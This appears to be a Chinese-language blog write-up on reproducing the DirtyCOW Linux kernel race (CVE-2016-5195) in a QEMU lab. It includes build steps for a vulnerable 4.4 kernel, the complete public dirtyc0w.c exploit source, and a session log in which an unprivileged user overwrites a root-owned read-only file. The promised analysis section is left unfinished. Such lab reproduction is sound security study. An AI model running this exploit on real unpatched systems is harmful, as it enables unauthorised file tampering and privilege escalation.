---
title: "CVE-2016-5195 Linux DirtyCOW漏洞分析"
description: "经典的内核提权漏洞"
date: 2022-05-24T17:43:25+08:00
categories: "漏洞分析"
tags: [ "Kernel" ]
image: https://s2.loli.net/2022/05/24/JFAS5mGpYn9utWi.jpg
---



## 背景知识

### DirtyCOW

- [https://dirtycow.ninja/](https://dirtycow.ninja/)
- [https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
- [https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails)

### Copy on Write

- [https://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html](https://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html)
- [https://blog.csdn.net/puliao4167/article/details/87894191](https://blog.csdn.net/puliao4167/article/details/87894191)

### Page Cache

- [https://en.wikipedia.org/wiki/Page_cache](https://en.wikipedia.org/wiki/Page_cache)

### mmap

- [https://www.cnblogs.com/huxiao-tee/p/4660352.html](https://www.cnblogs.com/huxiao-tee/p/4660352.html)

### 内核文件系统

- [https://www.cnblogs.com/huxiao-tee/p/4657851.html](https://www.cnblogs.com/huxiao-tee/p/4657851.html)

### 条件竞争

- [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/race-condition/introduction-zh/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/race-condition/introduction-zh/)



## 环境准备

### Linux Kernel

#### 直接下载

选取一个有漏洞的版本4.4.0，下载ubuntu对应的deb包。解压得到`./boot/vmlinuz-4.4.0-31-generic`

```sh
wget http://security.ubuntu.com/ubuntu/pool/main/l/linux/linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb
ar xv linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb
tar jxvf data.tar.bz2
```

缺点是由此得到的bootable kernel中不包含调试信息。

#### 自行编译

获取Linux Kernel源码仓库并切换到一个有漏洞的版本4.4：

```sh
git clone https://mirrors.tuna.tsinghua.edu.cn/git/linux.git
cd linux
git checkout v4.4
```

载入x86_64的默认配置：

```sh
make x86_64_defconfig
```

使用Linux提供的脚本一键启用DEBUG_KERNEL、DEBUG_INFO、KGDB、GDB_SCRIPTS，关闭RANDOMIZE_BASE（kaslr）

```sh
./scripts/config --file .config -e DEBUG_KERNEL -e DEBUG_INFO -e GDB_SCRIPTS -e KGDB -d RANDOMIZE_BASE
```

由于是旧版kernel，需在老环境中编译。采用docker创建ubuntu16.04的编译环境：

```sh
sudo docker run -it --rm -v /home/zkv/Laboratory/dirtycow/linux:/linux ubuntu:16.04 /bin/bash
```

于该container中准备编译环境并编译：

```sh
apt update; apt install -y apt-transport-https
cat > /etc/apt/sources.list << EOF
deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse
deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse
deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse
deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse
EOF
apt update; apt upgrade -y
apt install gcc make bc
cd /linux
make -j`nproc`
```

即得到bootable kernel。

### PoC

从[https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)选取dirtyc0w.c：

```c
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;
 
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
 
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,(uintptr_t) map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}
 
 
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc<3) {
  (void)fprintf(stderr, "%s\n",
      "usage: dirtyc0w target_file new_content");
  return 1; }
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %zx\n\n",(uintptr_t) map);
/*
You have to do it on two threads.
*/
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
```

编译PoC：

```sh
gcc -static -pthread dirtyc0w.c -o dirtyc0w
```

### rootfs

这里采用busybox手动构建。克隆busybox源码仓库，进行menuconfig配置：

```sh
git clone https://git.busybox.net/busybox/
cd busybox
make menuconfig
```

Setttings 选中 Build static binary (no shared libs)，进行成静态链接构建。

此后使用`make install`，生成`_install`目录，内含可被当作根文件树使用的安装文件。

接下来我们来定制稍后的rootfs。先来到`_install`创建必要的目录和文件：

```sh
cd _install
mkdir -p proc sys dev etc/init.d
mkdir home root
echo "root::0:0:root:/root:/bin/sh" > etc/passwd
# 此处将root:x:0:0:root:/root:/bin/sh中的x删除即可无密码登陆root
echo "root:x:0:" > etc/group
```

编写init脚本：

```sh
cat > ./init << EOF
#!/bin/sh
mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t debugfs none /sys/kernel/debug
mount -t tmpfs none /tmp
setsid /bin/cttyhack setuidgid 1000 /bin/sh
EOF
chmod +x ./init
```

由于类似tar、cpio的归档程序会将文件的inode一同打包，故host文件系统中的文件所属、权限等信息也会呈现在qemu guest中。所以这里我们需先为busybox进行必要的权限调整：

```sh
sudo chown root:root busybox/_install/bin/busybox
sudo chmod u+s busybox/_install/bin/busybox
```

将PoC加入后，打包cpio格式的initramfs：

```sh
cp dirtyc0w busybox/_install/bin
cd busybox/_install
find . | cpio -o --format=newc > ../../rootfs.img
# 解包命令
# cpio -idmv < rootfs.img
```

rootfs即准备完毕。

## 漏洞复现

上一步已经得到了：

- 带调试信息的Linux Kernel：bzImage
- 包含了PoC的文件系统initramfs镜像：rootfs.img

我们使用qemu将其启动：

```sh
qemu-system-x86_64 \
  -kernel bzImage \
  -initrd rootfs.img \
  -append "console=ttyS0" \
  -nographic
```

进入qemu guest后：

```sh
~ $ id
uid=1000 gid=1000 groups=1000
~ $ ls -l /bin/dirtyc0w
-rwxrwxr-x    1 1000     1000       1023952 Aug 18 08:00 /bin/dirtyc0w
~ $ su
/ # echo nothing > foo
/ # chmod 0404 foo
/ # ls -lah foo
-r-----r--    1 root     root          16 Aug 18 08:48 foo
/ # ^D
~ $ cat foo
nothing
~ $ dirtyc0w foo hacked!!!
mmap 7fd5597c8000
^C
~ $ cat foo
hacked!!!
```

至此漏洞成功复现！🥳

## 漏洞分析

Waiting 

https://xz.aliyun.com/t/7561



